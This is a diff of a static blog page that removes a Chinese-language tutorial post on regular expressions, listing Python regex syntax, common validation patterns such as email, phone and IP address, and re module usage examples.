-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-02T00:00:00+08:00">
-                2018-09-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h1><p>正则表达式，又称规则表达式。（英语：Regular Expression，在代码中常简写为regex、regexp或RE），计算机科学的一个概念。正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本，用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。  </p>
-<p>正则表达式的大致匹配过程是：  </p>
-<ol>
-<li>依次拿出表达式和文本中的字符比较，  </li>
-<li>如果每一个字符都能匹配，则匹配成功；一旦有匹配不成功的字符则匹配失败。  </li>
-<li>如果表达式中有量词或边界，这个过程会稍微有一些不同。  </li>
-</ol>
-<h1 id="正则表达式python的语法规则"><a href="#正则表达式python的语法规则" class="headerlink" title="正则表达式python的语法规则"></a>正则表达式python的语法规则</h1><pre><code>元字符    说明
-.     代表任意字符
-\      
-[ ]     匹配内部的任一字符或子表达式
-[^]     对字符集和取非
--     定义一个区间
-\     对下一字符取非（通常是普通变特殊，特殊变普通）
-*     匹配前面的字符或者子表达式0次或多次
-*?     惰性匹配上一个
-+     匹配前一个字符或子表达式一次或多次
-+?     惰性匹配上一个
-?     匹配前一个字符或子表达式0次或1次重复
-{n}     匹配前一个字符或子表达式
-{m,n}     匹配前一个字符或子表达式至少m次至多n次
-{n,}     匹配前一个字符或者子表达式至少n次
-{n,}?     前一个的惰性匹配
-^     匹配字符串的开头
-\A     匹配字符串开头
-$     匹配字符串结束
-[\b]     退格字符
-\c     匹配一个控制字符
-\d     匹配任意数字
-\D     匹配数字以外的字符
- \t     匹配制表符
-\w     匹配任意数字字母下划线
-\W     不匹配数字字母下划线</code></pre><p>一、校验数字的表达式</p>
-<pre><code>数字：^[0-9]*$
-
-n位的数字：^\d{n}$
-
-至少n位的数字：^\d{n,}$
-
-m-n位的数字：^\d{m,n}$
-
-零和非零开头的数字：^(0|[1-9][0-9]*)$
-
-非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]{1,2})?$
-
-带1-2位小数的正数或负数：^(\-)?\d+(\.\d{1,2})?$
-
-正数、负数、和小数：^(\-|\+)?\d+(\.\d+)?$
-
-有两位小数的正实数：^[0-9]+(.[0-9]{2})?$
-
-有1~3位小数的正实数：^[0-9]+(.[0-9]{1,3})?$
-
-非零的正整数：^[1-9]\d*$ 或 ^([1-9][0-9]*){1,3}$ 或 ^\+?[1-9][0-9]*$
-
-非零的负整数：^\-[1-9][]0-9″*$ 或 ^-[1-9]\d*$
-
-非负整数：^\d+$ 或 ^[1-9]\d*|0$
-
-非正整数：^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$
-
-非负浮点数：^\d+(\.\d+)?$ 或 ^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$
-
-非正浮点数：^((-\d+(\.\d+)?)|(0+(\.0+)?))$ 或 ^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$
-
-正浮点数：^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$ 或 ^(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$
-
-负浮点数：^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$ 或 ^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$
-
-浮点数：^(-?\d+)(\.\d+)?$ 或 ^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$</code></pre><p>二、校验字符的表达式</p>
-<pre><code>汉字：^[\u4e00-\u9fa5]{0,}$
-
-英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$
-
-长度为3-20的所有字符：^.{3,20}$
-
-由26个英文字母组成的字符串：^[A-Za-z]+$
-
-由26个大写英文字母组成的字符串：^[A-Z]+$
-
-由26个小写英文字母组成的字符串：^[a-z]+$
-
-由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$
-
-由数字、26个英文字母或者下划线组成的字符串：^\w+$ 或 ^\w{3,20}$
-
-中文、英文、数字包括下划线：^[\u4E00-\u9FA5A-Za-z0-9_]+$
-
-中文、英文、数字但不包括下划线等符号：^[\u4E00-\u9FA5A-Za-z0-9]+$ 或 ^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$
-
-可以输入含有^%&amp;’,;=?$\”等字符：[^%&amp;&apos;,;=?$\x22]+
-
-禁止输入含有~的字符：[^~\x22]+</code></pre><p>三、特殊需求表达式</p>
-<pre><code>Email地址：^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$
-
-域名：[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.?
-
-InternetURL：[a-zA-z]+://[^\s]* 或 ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]*)?$
-
-手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$
-
-电话号码(“XXX-XXXXXXX”、”XXXX-XXXXXXXX”、”XXX-XXXXXXX”、”XXX-XXXXXXXX”、”XXXXXXX”和”XXXXXXXX)：^($$\d{3,4}-)|\d{3.4}-)?\d{7,8}$
-
-国内电话号码(0511-4405222、021-87888822)：\d{3}-\d{8}|\d{4}-\d{7}
-
-身份证号(15位、18位数字)：^\d{15}|\d{18}$
-
-短身份证号码(数字、字母x结尾)：^([0-9]){7,18}(x|X)?$ 或 ^\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$
-
-帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$
-
-密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\w{5,17}$
-
-强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$
-
-日期格式：^\d{4}-\d{1,2}-\d{1,2}
-
-一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$
-
-一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$
-
-钱的输入格式：
-
-    有四种钱的表示形式我们可以接受:”10000.00″ 和 “10,000.00″, 和没有 “分” 的 “10000″ 和 “10,000″：^[1-9][0-9]*$
-
-    这表示任意一个不以0开头的数字，但是，这也意味着一个字符”0″不通过，所以我们采用下面的形式：^(0|[1-9][0-9]*)$
-
-    一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0|-?[1-9][0-9]*)$
-
-    这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉，因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$
-
-    必须说明的是，小数点后面至少应该有1位数，所以”10.”是不通过的，但是 “10″ 和 “10.2″ 是通过的：^[0-9]+(.[0-9]{2})?$
-
-    这样我们规定小数点后面必须有两位，如果你认为太苛刻了，可以这样：^[0-9]+(.[0-9]{1,2})?$
-
-    这样就允许用户只写一位小数。下面我们该考虑数字中的逗号了，我们可以这样：^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$
-
-    1到3个数字，后面跟着任意个 逗号+3个数字，逗号成为可选，而不是必须：^([0-9]+|[0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$
-
-    备注：这就是最终结果了，别忘了”+”可以用”*”替代。如果你觉得空字符串也可以接受的话(奇怪，为什么?)最后，别忘了在用函数时去掉去掉那个反斜杠，一般的错误都在这里
-
-xml文件：^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\.[x|X][m|M][l|L]$
-
-中文字符的正则表达式：[\u4e00-\u9fa5]
-
-双字节字符：[^\x00-\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1))
-
-空白行的正则表达式：\n\s*\r (可以用来删除空白行)
-
-HTML标记的正则表达式：&lt;(\S*?)[^&gt;]*&gt;.*?&lt;/\1&gt;|&lt;.*? /&gt; (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力)
-
-首尾空白字符的正则表达式：^\s*|\s*$或(^\s*)|(\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)
-
-腾讯QQ号：[1-9][0-9]{4,} (腾讯QQ号从10000开始)
-
-中国邮政编码：[1-9]\d{5}(?!\d) (中国邮政编码为6位数字)
-
-IP地址：\d+\.\d+\.\d+\.\d+ (提取IP地址时有用)
-
-IP地址：((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)) (由@飞龙三少 提供，感谢共享)</code></pre><p><img src="http://qiniu.cuiqingcai.com/wp-content/uploads/2015/02/20130515113723855.png" alt="附图"></p>
-<h1 id="语法规则附带实例"><a href="#语法规则附带实例" class="headerlink" title="语法规则附带实例"></a>语法规则附带实例</h1><p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/7iEcas39lXgLm48HssNux2sR0.jlx13exqaOpAbMkV0!/b/dH4BAAAAAAAA&bo=CAMDAwAAAAADFzk!&rf=viewer_4" alt="附图">  </p>
-<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/6aVpDH2IQgnOGURdVzBIiEOk51Ghzvjf7u98ZFlbCas!/b/dDwBAAAAAAAA&bo=rwJnAwAAAAADF*s!&rf=viewer_4" alt="附图">  </p>
-<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/DiY*jYsg*SYbraZKPKlrMkU559SPADAyRaa9Tdk*EYw!/b/dNwAAAAAAAAA&bo=0gJAAwAAAAADF6E!&rf=viewer_4" alt="附图">  </p>
-<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/JZIBVgqjU5UDskpGYul.HaUNCBMm2JjDiNpVWPse1.s!/b/dOAAAAAAAAAA&bo=1wLMAgAAAAADFyk!&rf=viewer_4" alt="附图"></p>
-<h1 id="反斜杠问题"><a href="#反斜杠问题" class="headerlink" title="反斜杠问题"></a>反斜杠问题</h1><p>与大多数编程语言相同，正则表达式里使用”\”作为转义字符，这就可能造成反斜杠困扰。假如你需要匹配文本中的字符”\”，那么使用编程语言表示的正则表达式里将需要4个反斜杠”\\”：前两个和后两个分别用于在编程语言里转义成反斜杠，转换成两个反斜杠后再在正则表达式里转义成一个反斜杠。</p>
-<p>Python里的原生字符串很好地解决了这个问题，这个例子中的正则表达式可以使用r”\”表示。同样，匹配一个数字的”\d”可以写成r”\d”。有了原生字符串，妈妈也不用担心是不是漏写了反斜杠，写出来的表达式也更直观勒</p>
-<h1 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h1><p>Python 自带了re模块，它提供了对正则表达式的支持。主要用到的方法列举如下:  </p>
-<pre><code>#返回pattern对象
-re.compile(string[,flag])  
-#以下为匹配所用函数
-re.match(pattern, string[, flags])
-re.search(pattern, string[, flags])
-re.split(pattern, string[, maxsplit])
-re.findall(pattern, string[, flags])
-re.finditer(pattern, string[, flags])
-re.sub(pattern, repl, string[, count])
-re.subn(pattern, repl, string[, count])</code></pre><p>Python通过re模块提供对正则表达式的支持。使用re的一般步骤是先将正则表达式的字符串形式编译为Pattern实例，然后使用Pattern实例处理文本并获得匹配结果（一个Match实例），最后使用Match实例获得信息，进行其他的操作。  </p>
-<p>pattern可以理解为一个匹配模式，那么我们怎么获得这个匹配模式呢？很简单，我们需要利用re.compile方法就可以。例如:pattern = re.compile(r’hello’)</p>
-<p>在参数中我们传入了原生字符串对象，通过compile方法编译生成一个pattern对象，然后我们利用这个对象来进行进一步的匹配。<br>另外大家可能注意到了另一个参数 flags，在这里解释一下这个参数的含义：</p>
-<p>参数flag是匹配模式，取值可以使用按位或运算符’|’表示同时生效，比如re.I | re.M。  </p>
-<p>可选值有:</p>
-<pre><code>• re.I(全拼：IGNORECASE): 忽略大小写（括号内是完整写法，下同）
-• re.M(全拼：MULTILINE): 多行模式，改变&apos;^&apos;和&apos;$&apos;的行为（参见上图）
-• re.S(全拼：DOTALL): 点任意匹配模式，改变&apos;.&apos;的行为
-• re.L(全拼：LOCALE): 使预定字符类 \w \W \b \B \s \S 取决于当前区域设定
-• re.U(全拼：UNICODE): 使预定字符类 \w \W \b \B \s \S \d \D 取决于unicode定义的字符属性
-• re.X(全拼：VERBOSE): 详细模式。这个模式下正则表达式可以是多行，忽略空白字符，并可以加入注释。</code></pre><h1 id="简单匹配"><a href="#简单匹配" class="headerlink" title="简单匹配"></a>简单匹配</h1><pre><code># _*_ coding: UTF-8 _*_
-import re
-
-pattern=re.compile(r&apos;hello&apos;,re.IGNORECASE) # 将正则表达式编译成Pattern对象,不区分大小写re.IGNORECASE
-result1=re.match(pattern,&apos;hello1&apos;)
-#或result1 = pattern.match(&apos;hello world!&apos;)
-if result1:
-    print(result1.group())
-else:
-    print(&apos;匹配失败&apos;）</code></pre><h1 id="re-match和re-search的区别"><a href="#re-match和re-search的区别" class="headerlink" title="re.match和re.search的区别"></a>re.match和re.search的区别</h1><p>re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。</p>
-<pre><code>import re
-line = &quot;Cats are smarter than dogs&quot;;
-matchObj = re.match( r&apos;dogs&apos;, line, re.M|re.I)
-if matchObj:
-   print &quot;match --&gt; matchObj.group() : &quot;, matchObj.group()
-else:
-   print &quot;No match!!&quot;
-matchObj = re.search( r&apos;dogs&apos;, line, re.M|re.I)
-if matchObj:
-   print &quot;search --&gt; matchObj.group() : &quot;, matchObj.group()
-else:
-   print &quot;No match!!&quot;</code></pre><p>参考：<a href="https://www.cnblogs.com/cp-miao/p/5567115.html" target="_blank" rel="noopener">文章</a></p>
-<p>参考：<a href="https://cuiqingcai.com/977.html" target="_blank" rel="noopener">文章</a></p>
-<hr>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2669,7 +2469,7 @@ else:
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
